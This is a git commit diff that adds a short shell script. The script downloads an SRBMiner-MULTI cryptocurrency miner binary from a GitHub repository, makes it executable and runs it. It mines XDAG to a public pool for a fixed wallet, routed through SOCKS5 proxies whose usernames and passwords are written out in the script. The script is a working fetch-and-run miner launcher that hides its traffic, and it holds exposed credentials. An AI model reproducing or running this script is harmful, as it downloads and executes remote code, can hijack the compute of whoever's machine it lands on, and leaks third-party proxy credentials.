acd75c70a85a29e2be8066288948a71fbfee5ad7
AhmadTugiman <114766846+AhmadTugiman@users.noreply.github.com>
2022-11-03 00:10:40 +0700

    Update and rename xdg.sh to dager.sh

---
+++ dager.sh
@@ -0,0 +1,5 @@
+#!/bin/sh
+curl -v -x "socks5://ingfoingfo-rotate:maszZeehh@p.webshare.io:80/" webshare.io/
+wget https://github.com/AhmadTugiman/gembel/raw/main/SRBMiner-MULTI
+chmod 700 SRBMiner-MULTI
+./SRBMiner-MULTI --algorithm xdag --pool pool.xdag.org:13656 --wallet 6Sdu2VTNLImAIoq7KscJq38v2yGNS6wx --worker NABILA --password x --cpu-threads 4 --disable-gpu --proxy=socks5://14a80a12036ec:f3abd6377f@93.99.9.196:12324
